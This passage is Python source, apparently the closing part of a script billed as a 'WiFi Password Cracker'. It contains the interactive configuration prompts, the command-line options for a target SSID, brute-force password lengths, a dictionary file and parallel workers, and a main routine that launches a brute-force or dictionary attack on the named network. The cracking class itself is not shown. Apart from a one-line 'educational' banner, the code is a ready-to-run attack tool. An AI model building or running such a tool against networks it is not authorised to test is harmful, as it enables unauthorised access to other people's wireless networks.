        input_str = input("🔢 Enter password lengths (e.g., 4 5 6): ").strip()
        
        if not input_str:
            print("❌ Please enter at least one password length.")
            continue
        
        try:
            lengths = [int(x.strip()) for x in input_str.split()]
            
            if any(length <= 0 for length in lengths):
                print("❌ Password lengths must be positive numbers.")
                continue
            
            if any(length > 12 for length in lengths):
                print("⚠️ Warning: Password lengths > 12 will take extremely long time!")
                confirm = input("Continue anyway? (y/n): ").strip().lower()
                if confirm not in ['y', 'yes']:
                    continue
            
            print(f"\n🔍 You selected lengths: {lengths}")
            confirm = input("Is this correct? (y/n): ").strip().lower()
            
            if confirm in ['y', 'yes']:
                return lengths
            elif confirm in ['n', 'no']:
                print("Let's try again...")
            else:
                print("Invalid input. Please enter 'y' or 'n'.")
                
        except ValueError:
            print("❌ Invalid input. Please enter numbers separated by spaces.")

def show_advanced_options() -> dict:
    """Interactive prompt for advanced configuration options."""
    print("\n" + "="*60)
    print("ADVANCED CONFIGURATION")
    print("="*60)
    print("Configure advanced settings or press Enter to use defaults.\n")
    
    options = {}
    
    workers_input = input(f"🚀 Max parallel workers (default: {config.max_workers}): ").strip()
    if workers_input:
        try:
            options['max_workers'] = int(workers_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['max_workers'] = config.max_workers
    else:
        options['max_workers'] = config.max_workers
    
    delay_input = input(f"⏱️ Delay between attempts in seconds (default: {config.delay_between_attempts}): ").strip()
    if delay_input:
        try:
            options['delay_between_attempts'] = float(delay_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['delay_between_attempts'] = config.delay_between_attempts
    else:
        options['delay_between_attempts'] = config.delay_between_attempts
    
    batch_input = input(f"📦 Batch size (default: {config.batch_size}): ").strip()
    if batch_input:
        try:
            options['batch_size'] = int(batch_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['batch_size'] = config.batch_size
    else:
        options['batch_size'] = config.batch_size
    
    # Enhanced verification options
    stabilize_input = input(f"🔧 Connection stabilize time in seconds (default: {config.connection_stabilize_time}): ").strip()
    if stabilize_input:
        try:
            options['connection_stabilize_time'] = float(stabilize_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['connection_stabilize_time'] = config.connection_stabilize_time
    else:
        options['connection_stabilize_time'] = config.connection_stabilize_time
    
    retries_input = input(f"🔧 Verification retries (default: {config.verification_retries}): ").strip()
    if retries_input:
        try:
            options['verification_retries'] = int(retries_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['verification_retries'] = config.verification_retries
    else:
        options['verification_retries'] = config.verification_retries
    
    retry_delay_input = input(f"🔧 Verification retry delay in seconds (default: {config.verification_retry_delay}): ").strip()
    if retry_delay_input:
        try:
            options['verification_retry_delay'] = float(retry_delay_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['verification_retry_delay'] = config.verification_retry_delay
    else:
        options['verification_retry_delay'] = config.verification_retry_delay
    
    portal_input = input("🌐 Check for captive portals? (y/n, default: n): ").strip().lower()
    if portal_input in ['y', 'yes']:
        options['check_captive_portal'] = True
    else:
        options['check_captive_portal'] = False
    
    preserve_input = input("💾 Preserve internet connection during attack? (y/n, default: n): ").strip().lower()
    if preserve_input in ['y', 'yes']:
        options['preserve_connection'] = True
    else:
        options['preserve_connection'] = False
    
    connectivity_input = input("🔗 Test actual connectivity? (y/n, default: y): ").strip().lower()
    if connectivity_input in ['n', 'no']:
        options['test_connectivity'] = False
    else:
        options['test_connectivity'] = True
    
    sequential_input = input("🔄 Use sequential mode instead of parallel? (y/n, default: n): ").strip().lower()
    if sequential_input in ['y', 'yes']:
        options['sequential'] = True
    else:
        options['sequential'] = False
    
    return options

# -----------------------------
# Utility Functions
# -----------------------------

def graceful_exit(signum=None, frame=None) -> None:
    """Handle graceful termination signals."""
    with log_lock:
        logger.info("[STOP] Termination signal received. Stopping...")
    terminate_event.set()

def print_banner() -> None:
    """Print application banner."""
    banner = f"""
╔══════════════════════════════════════════════════════════╗
║                    WiFi Password Cracker                 ║
║        Enhanced Cross-Platform Version v2.6              ║
║           For Educational & Security Testing Only       ║
║                    Running on: {os_info['os'].upper():<15} ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

# -----------------------------
# Argument Parsing
# -----------------------------

def parse_arguments() -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description="WiFi Password Cracker - Enhanced Cross-Platform Version with Dictionary Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -s MyNetwork -l 4 5 6
  %(prog)s --ssid "WiFi Name" --dictionary pw.txt
  %(prog)s -s TestNetwork -l 4 --workers 8 --delay 0.01
  %(prog)s --interactive  # Use interactive mode
        """
    )
    
    parser.add_argument(
        '-s', '--ssid',
        type=str,
        help='SSID of target WiFi network'
    )
    
    parser.add_argument(
        '-l', '--lengths',
        type=int,
        nargs='+',
        help='Password lengths to attempt (for brute force)'
    )
    
    parser.add_argument(
        '--dictionary',
        type=str,
        help='Path to dictionary file for dictionary attack'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging for debugging'
    )
    
    parser.add_argument(
        '-w', '--workers',
        type=int,
        help=f'Number of parallel workers (default: {config.max_workers})'
    )
    
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help=f'Delay between attempts in seconds (default: {config.delay_between_attempts})'
    )
    
    parser.add_argument(
        '--charset',
        type=str,
        default=config.characters,
        help='Custom character set for password generation'
    )
    
    parser.add_argument(
        '--sequential',
        action='store_true',
        help='Use sequential cracking instead of parallel'
    )
    
    parser.add_argument(
        '--check-portal',
        action='store_true',
        help='Check for captive portals (for open networks)'
    )
    
    parser.add_argument(
        '--preserve-connection',
        action='store_true',
        help='Preserve internet connection during attacks'
    )
    
    parser.add_argument(
        '--no-connectivity-test',
        action='store_true',
        help='Skip actual connectivity testing'
    )
    
    parser.add_argument(
        '--stabilize-time',
        type=float,
        default=config.connection_stabilize_time,
        help=f'Time to wait for connection to stabilize (default: {config.connection_stabilize_time})'
    )
    
    parser.add_argument(
        '--verification-retries',
        type=int,
        default=config.verification_retries,
        help=f'Number of verification attempts (default: {config.verification_retries})'
    )
    
    parser.add_argument(
        '-i', '--interactive',
        action='store_true',
        help='Use interactive mode for configuration'
    )
    
    return parser.parse_args()

# -----------------------------
# Main Function
# -----------------------------

def main() -> None:
    """Main entry point of the application."""
    args = parse_arguments()
    
    if args.interactive or not args.ssid:
        print_banner()
        print("Welcome to Interactive Mode!")
        print("Let's configure your WiFi penetration test step by step.\n")
        
        mode, dictionary_file = get_attack_mode()
        ssid = get_target_ssid() if not args.ssid else args.ssid
        password_lengths = None
        if mode == 'brute':
            password_lengths = get_password_lengths() if not args.lengths else args.lengths
        
        advanced_options = show_advanced_options()
        
        args.ssid = ssid
        args.mode = mode
        args.dictionary = dictionary_file
        args.lengths = password_lengths
        args.max_workers = advanced_options.get('max_workers') or args.workers or config.max_workers
        args.delay_between_attempts = advanced_options.get('delay_between_attempts') or args.delay or config.delay_between_attempts
        args.check_portal = advanced_options.get('check_captive_portal', args.check_portal)
        args.preserve_connection = advanced_options.get('preserve_connection', args.preserve_connection)
        args.test_connectivity = advanced_options.get('test_connectivity', not args.no_connectivity_test)
        args.sequential = advanced_options.get('sequential', args.sequential)
        args.stabilize_time = advanced_options.get('connection_stabilize_time', args.stabilize_time)
        args.verification_retries = advanced_options.get('verification_retries', args.verification_retries)
                
    else:
        mode = 'dictionary' if args.dictionary else 'brute'
        if mode == 'brute' and not args.lengths:
            args.lengths = config.default_password_lengths
        if not args.workers:
            args.workers = config.max_workers
        if not args.delay:
            args.delay = config.delay_between_attempts
        
        args.mode = mode
        args.test_connectivity = not args.no_connectivity_test
        
        print_banner()
    
    # Update config with arguments
    config.characters = args.charset
    config.max_workers = args.max_workers
    config.delay_between_attempts = args.delay_between_attempts
    config.check_captive_portal = args.check_portal
    config.preserve_connection = args.preserve_connection
    config.test_connectivity = args.test_connectivity
    config.connection_stabilize_time = args.stabilize_time
    config.verification_retries = args.verification_retries
    
    setup_logging(args.verbose)
    
    try:
        signal.signal(signal.SIGINT, graceful_exit)
        signal.signal(signal.SIGTERM, graceful_exit)
    except Exception as e:
        logger.warning(f"[WARN] Could not set signal handlers: {e}")
    
    cracker = None
    try:
        if args.mode == 'dictionary':
            cracker = WiFiCracker(
                ssid=args.ssid,
                mode='dictionary',
                dictionary_file=args.dictionary
            )
            
            if args.sequential:
                result = cracker.crack_dictionary_sequential()
            else:
                result = cracker.crack_dictionary_parallel()
        else:
            cracker = WiFiCracker(
                ssid=args.ssid,
                mode='brute',
                password_lengths=args.lengths
            )
            
            if args.sequential:
                result = cracker.crack_passwords_sequential()
            else:
                result = cracker.crack_passwords_parallel()
        
        if result is None:
            elapsed = time.time() - cracker.start_time
            with log_lock:
                logger.warning("[WARN] Password not found")
                logger.info(f"[TIME] Total time elapsed: {elapsed:.2f} seconds")
                logger.info(f"[COUNT] Total attempts made: {cracker.attempts}")
    
    except KeyboardInterrupt:
        logger.info("User interrupted the process")
    
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    
    finally:
        if cracker and config.preserve_connection:
            cracker.connection_preserver.restore_connection()
        logger.info("[END] Script execution completed")

if __name__ == "__main__":
    main()
